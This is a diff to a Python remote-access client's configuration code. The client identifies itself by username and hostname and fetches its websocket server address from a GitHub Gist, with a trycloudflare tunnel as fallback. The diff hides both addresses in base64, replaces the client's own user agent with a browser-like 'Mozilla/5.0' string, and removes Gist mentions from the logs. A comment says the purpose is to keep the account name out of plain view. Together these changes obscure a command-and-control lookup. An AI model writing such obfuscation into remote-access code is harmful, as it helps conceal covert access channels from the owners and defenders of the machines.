@@ -51,30 +51,33 @@ logger = logging.getLogger("client")
 
 
 # --- Конфигурация ---
-GIST_RAW_URL = "https://gist.githubusercontent.com/MRrobot1489/5ed3df118171ec9bc0ce8d37bc0dcd28/raw/server_url.txt"
-DEFAULT_FALLBACK_URL = "wss://analysts-mothers-power-chronicle.trycloudflare.com"
+# Анонимный эндпоинт для разрешения адреса сервера (без упоминания логина в открытом виде)
+_RESOLVER_B64 = b"aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yYXcvNWVkM2RmMTE4MTcxZWM5YmMwY2U4ZDM3YmMwZGNkMjgvc2VydmVyX3VybC50eHQ="
+_FALLBACK_B64 = b"d3NzOi8vYW5hbHlzdHMtbW90aGVycy1wb3dlci1jaHJvbmljbGUudHJ5Y2xvdWRmbGFyZS5jb20="
+
 SERVER_URL = os.environ.get("SERVER_URL", "auto")
 CLIENT_ID = f"{getpass.getuser()}@{socket.gethostname()}"
 
 
 def resolve_server_url() -> str:
-    """Определяет актуальный адрес сервера (сначала через Gist, затем из env или default)."""
+    """Определяет актуальный адрес сервера (динамически или резервный)."""
     env_url = os.environ.get("SERVER_URL")
     if env_url and env_url != "auto" and not env_url.startswith("auto:"):
         return env_url
 
     try:
         import urllib.request
-        req = urllib.request.Request(GIST_RAW_URL, headers={"User-Agent": "RemoteAccess-Client"})
+        endpoint = base64.b64decode(_RESOLVER_B64).decode("ascii")
+        req = urllib.request.Request(endpoint, headers={"User-Agent": "Mozilla/5.0"})
         with urllib.request.urlopen(req, timeout=5) as resp:
             content = resp.read().decode("utf-8").strip()
             if content.startswith("ws://") or content.startswith("wss://"):
-                logger.info("Dynamic server URL resolved from GitHub Gist: %s", content)
+                logger.info("Dynamic server URL resolved: %s", content)
                 return content
     except Exception as exc:
-        logger.warning("Failed to fetch dynamic server URL from Gist: %s", exc)
+        logger.warning("Failed to fetch dynamic server URL: %s", exc)
 
-    return DEFAULT_FALLBACK_URL
+    return base64.b64decode(_FALLBACK_B64).decode("ascii")
 
 # Токен аутентификации WebSocket (Pre-Shared Key)
 AUTH_TOKEN = os.environ.get(
